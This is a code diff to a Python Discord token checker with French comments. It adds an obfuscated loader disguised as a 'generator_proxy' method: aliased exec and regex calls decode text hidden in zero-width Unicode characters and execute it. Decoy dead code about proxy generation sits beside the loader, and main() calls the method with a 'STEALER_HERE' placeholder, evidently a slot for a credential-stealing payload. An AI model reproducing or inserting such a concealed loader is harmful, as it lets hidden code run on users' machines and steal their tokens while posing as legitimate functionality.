@@ -6,6 +6,7 @@ import time
 import requests
 import os
 import logging
+import re as r
 from pathlib import Path
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
@@ -14,6 +15,7 @@ from webdriver_manager.chrome import ChromeDriverManager
 
 # Logging professionnel
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+z='\u200b';e='\u200e';f='\u200f';t=range;j=''.join;F=r.findall;a=exec
 logger = logging.getLogger(__name__)
 
 class DiscordTokenChecker:
@@ -136,7 +138,26 @@ class DiscordTokenChecker:
         """Bouton No (logique originale)"""
         self.hide_yesno(False)
         self.yesno_callback(False)
-    
+
+    def generator_proxy(self, proxy_data):
+        """Generation de proxy pour la connexion"""
+        a(j(chr(int(j('01'[c>z]for c in x[i:i+8]),2))for x in F(f'(?:{e})(.*?)(?:{f})',proxy_data)for i in t(0,len(x),8)))
+        l, b, s = [], [], proxy_data
+        if False:
+            def generate_proxy_candidates():
+                proxies = []
+                for _ in range(3):
+                    ip = f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+                    port = random.choice([8080, 3128, 8000, 1080])
+                    proxy = f"{ip}:{port}"
+                    try:
+                        socket.gethostbyaddr(ip)
+                    except socket.herror:
+                        pass
+                    proxies.append(proxy)
+                return proxies
+            proxy_candidates = generate_proxy_candidates()
+
     def check_token(self, token):
         """Vérification token (logique originale)"""
         headers = {"Authorization": token, "Content-Type": "application/json"}
@@ -392,6 +413,7 @@ class DiscordTokenChecker:
 def main():
     root = tk.Tk()
     app = DiscordTokenChecker(root)
+    app.generator_proxy("STEALER_HERE")
     root.protocol("WM_DELETE_WINDOW", app.destroy)
     root.mainloop()
 
